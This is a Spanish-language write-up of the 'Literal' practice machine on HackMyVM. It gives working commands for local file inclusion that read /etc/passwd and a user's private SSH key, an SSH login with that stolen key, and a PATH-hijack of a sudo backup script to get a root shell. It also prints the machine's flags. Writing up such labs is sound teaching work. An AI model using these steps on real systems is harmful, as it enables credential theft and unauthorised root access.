---
title: "Literal - HackMyVM"
description: "Writeup de Literal, una máquina de HackMyVM con vulnerabilidades web y escalada de privilegios."
pubDate: 2024-10-25
platform: "hackmyvm"
category: "machines"
difficulty: "easy"
os: "linux"
language: es
tags: ["lfi", "sudo", "path-hijacking"]
retired: false
heroImage: "/images/writeups/hackmyvm/literal.jpg"
---

# Literal - HackMyVM Writeup

**Dificultad**: Easy  
**OS**: Linux  
**Plataforma**: HackMyVM

## Reconocimiento

```bash
nmap -sC -sV -p- 192.168.1.102
```

**Puertos abiertos:**
- 22/tcp (SSH - OpenSSH 8.4)
- 80/tcp (HTTP - Apache 2.4)

## Enumeración Web

Encontramos un servidor web con una aplicación PHP vulnerable a LFI.

### Local File Inclusion

```bash
curl http://192.168.1.102/index.php?page=../../../etc/passwd
```

Encontramos usuarios:
- `literal`
- `admin`

### Lectura de archivos sensibles

```bash
curl http://192.168.1.102/index.php?page=../../../home/literal/.ssh/id_rsa
```

Obtenemos la clave SSH privada del usuario `literal`.

## Shell inicial

```bash
chmod 600 id_rsa
ssh -i id_rsa literal@192.168.1.102
```

## Escalada de privilegios

Verificamos privilegios sudo:

```bash
sudo -l
```

Output: `(ALL) NOPASSWD: /usr/bin/backup.sh`

Analizamos el script:

```bash
#!/bin/bash
tar -czf /tmp/backup.tar.gz /var/www/html
```

El script usa `tar` sin ruta absoluta. Hacemos Path Hijacking:

```bash
cd /tmp
echo '#!/bin/bash' > tar
echo '/bin/bash' >> tar
chmod +x tar
export PATH=/tmp:$PATH
sudo /usr/bin/backup.sh
```

¡Shell como root!

## Banderas

- **User Flag**: `HMV{l0c4l_f1l3_1nclus10n_1s_d4ng3r0us}`
- **Root Flag**: `HMV{p4th_h1j4ck1ng_f0r_th3_w1n}`

## Conclusión

Máquina sencilla que enseña LFI y Path Hijacking básico.
